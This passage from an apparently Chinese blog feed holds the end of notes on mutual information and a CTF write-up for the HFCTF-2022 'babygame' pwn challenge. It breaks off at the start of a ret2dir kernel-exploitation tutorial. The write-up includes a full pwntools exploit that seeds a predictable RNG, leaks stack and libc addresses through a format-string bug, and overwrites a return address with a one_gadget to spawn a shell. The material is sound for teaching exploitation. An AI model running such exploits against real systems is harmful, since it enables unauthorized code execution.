style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.751884em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>性质：</p><ul><li>非负</li><li>对称：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>I</mi><mo stretchy="false">(</mo><mi>Y</mi><mo separator="true">;</mo><mi>X</mi><mo stretchy="false">)</mo><mo>≤</mo><mi>min</mi><mo>⁡</mo><mo stretchy="false">{</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">I(X;Y)=I(Y;X)\le \min\{H(X),H(Y)\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mclose">}</span></span></span></span></li><li>当X,Y概率独立时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">I(X;Y)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></li><li>当X,Y存在有一一对应关系时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(X;Y)=H(X)=H(Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></li></ul><p><font color=blue>平均条件互信息量：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mi mathvariant="normal">∣</mi><mi>Z</mi><mo stretchy="false">)</mo><mo>=</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mi>Z</mi><mo stretchy="false">)</mo><mo>−</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(X;Y|Z)=I(X;YZ)-I(X;Z)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span></span></span></span></font></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>虎符CTF-2022 babygame 题解</title>
      <link href="/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-babygame-%E9%A2%98%E8%A7%A3/"/>
      <url>/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-babygame-%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>这应该是今年虎符的pwn题里面最简单的一道题了。首先要过的关就是随机数。</p><p>源文件：<a href="https://github.com/Hornos3/pwnfile">my_github</a></p><p>在main函数输入姓名时有一个溢出，可以溢出到种子那里将种子修改。这样后面的结果就不会变了。用C语言写一个程序跑一下出结果。如下为脚本片段：</p><p><img src="https://img-blog.csdnimg.cn/10029907cd8b4896a2cbfc8ace1c9276.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input your name:&#x27;</span>, <span class="string">b&#x27;1234567890&#x27;</span> * <span class="number">26</span> + <span class="string">b&#x27;aaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">srand = <span class="number">0x30393837</span></span><br><span class="line"></span><br><span class="line">answer = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">  <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>,</span><br><span class="line">  <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>,</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, </span><br><span class="line">  <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, </span><br><span class="line">  <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line">  <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, </span><br><span class="line">  <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, </span><br><span class="line">  <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;round&#x27;</span>, <span class="built_in">str</span>(answer[i]).encode())</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Failed in &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>注意这里为什么输入name时要输入这个，我们将0x30393837作为种子，之后的部分用于填充栈内容，在b’aaaa’之后实际上就是canary了，我们之后不准备返回到这个位置，因此这个canary可以覆盖。覆盖之后程序输出时会将canary剩下的内容连带着后面的rbp一同输出，这样我们就能够获取栈的地址了。</p><p>在这之后会进入一个函数（以下称为vuln函数），里面有一个格式化字符串漏洞。</p><p>我们使用的libc版本与题目的版本相同，均为2.31。可以看到main函数的返回地址为__libc_start_main+243，我们可以使用格式化字符串漏洞将这个地址泄露出来。但是这里由于只有一个printf，在泄露之后还需要进行其他操作才有可能getshell，因此还需要将函数的返回地址修改一下。从IDA可以看到vuln函数的返回地址为0x1543，需要将其修改，如果能够再次进入vuln函数是最好。但是vuln函数的起始地址为0x13FB，如果将返回地址直接修改为vuln函数的起始地址，意味着我们需要修改返回地址最后两个字节。这就又会造成一个问题：倒数第二个字节的高4位无法确定。由页对齐我们可以修改最低12位，但同时这样修改会附带修改往上4位。这里成功率仅为1&#x2F;16。理论上可以实现，但是还有没有更好的办法了呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001539                 mov     eax, 0</span><br><span class="line">.text:000000000000153E                 call    vuln</span><br><span class="line">.text:0000000000001543</span><br><span class="line">.text:0000000000001543 loc_1543:                               ; CODE XREF: main+D2↑j</span><br><span class="line">.text:0000000000001543                 mov     eax, 0</span><br><span class="line">.text:0000000000001548                 mov     rcx, [rbp+var_18]</span><br></pre></td></tr></table></figure><p>答案当然是肯定的。我们不一定非得把返回地址改成vuln的起始地址，改成调用vuln函数的地址不也行吗，刚好上面就是调用call指令，我们只需要修改最低1字节为3E就可以返回到153E，然后直接call再次进入。这样的话，字符串的前面一部分就是%62c%8$hhn，后面跟%79$p或%79$llx获取到__libc_start_main+243的地址和返回地址指针。这是第一轮格式化字符串漏洞注入。为了确保对齐，在’%79$p’前面加上一个’a’。</p><p><img src="https://img-blog.csdnimg.cn/bfb5f848e25c4345960890986edca36b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(b&#x27;Good luck to you.&#x27;, </span><br><span class="line">b&#x27;%62c%8$hhna%79$p&#x27; + p64(stack_addr - 0x218))</span><br></pre></td></tr></table></figure><p>注入之后，程序会返回libc的偏移地址。</p><p>然后我们进行第二次格式化字符串注入。通过gdb调试知道第二次注入和第一次注入时返回地址所在的位置是一样的。我们就可以套用这个地址。</p><p>使用one_gadget工具获取到这个版本中一共有3个one_gadget：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0xe3b2e execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b31 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b34 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure><p>我们逐一尝试。</p><p>我一开始使用LibcSearcher查偏移，发现都不行，用ELF.symbols直接解析本机libc文件就可以。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./babygame&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input your name:&#x27;</span>, <span class="string">b&#x27;1234567890&#x27;</span> * <span class="number">26</span> + <span class="string">b&#x27;aaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello, &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">260</span> + <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">srand = <span class="number">0x30393837</span></span><br><span class="line"></span><br><span class="line">answer = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">  <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>,</span><br><span class="line">  <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>,</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, </span><br><span class="line">  <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, </span><br><span class="line">  <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line">  <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, </span><br><span class="line">  <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, </span><br><span class="line">  <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;round&#x27;</span>, <span class="built_in">str</span>(answer[i]).encode())</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Failed in &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Good luck to you.&#x27;</span>, </span><br><span class="line"><span class="string">b&#x27;%62c%8$hhna%79$p&#x27;</span> + p64(stack_addr - <span class="number">0x218</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>).decode(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">libc_addr -= <span class="number">243</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_addr)</span></span><br><span class="line">Libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># base = libc_addr - Libc.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class="line">base = libc_addr - Libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">libc_system_addr = Libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">mem_system_addr = base + libc_system_addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr - <span class="number">0x218</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0xE3B2E</span> + base, <span class="number">0xE3B31</span> + base, <span class="number">0xE3B34</span> + base]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;stack_addr - <span class="number">0x218</span>: one_gadget[<span class="number">1</span>]&#125;)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Good luck to you.&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/08fa654ff07f4141837b14f0f93153a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><p>这道题看似简单，实际上细节还是比较多的。如果做题做的不多的话很容易在一些地方就卡住了。因此后面还是多做题为妙。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel pwn 入门 (3)</title>
      <link href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-3/"/>
      <url>/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-3/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h1><p>这是一种绕过SMAP&#x2F;SMEP和PXN防护的攻击方式。利用内核空间的direct mapping area（起始位置为0xFFF8880000000000）。Linux对内存的访问采用的是多级页表的方式，将某段物理内存映射到程序的虚拟内存空间中的某段地址。而在Linux内核空间中，还存在着direct mapping area这块区域，对于物理映射到用户态内存的所有物理内存地址，在这里都能够进行访问，即用户态的每一页被映射的内存空间在这里也一样能够访问，二者访问同一块物理内存空间。</p><p>至于具体的利用方式是如何，还是看题目最为直接。<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9Aret2dir-physmap-spray">主要参考资料与题目来源</a></p><h2 id="LCTF2022-kgadget"><a href="#LCTF2022-kgadget" class="headerlink" title="LCTF2022-kgadget"></a>LCTF2022-kgadget</h2><p><img src="https://img-blog.csdnimg.cn/7cf0ef6e558f499ba8f43706ca7882f8.png" alt="在这里插入图片描述"></p><h3 id="ioctl函数分析"><a href="#ioctl函数分析" class="headerlink" title="ioctl函数分析"></a>ioctl函数分析</h3><p>首先找到ioctl函数，只有一个指令码114514有意义。其中有一个qmemcpy函数，这里的反汇编有一些问题，我们还是找到汇编来仔细看看。</p><p><img src="https://img-blog.csdnimg.cn/d5f8bda792ab4cc78fe27e483475f2ad.png"><br>这里提到了一个结构体pt_regs，我们来看下这是个什么东西。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 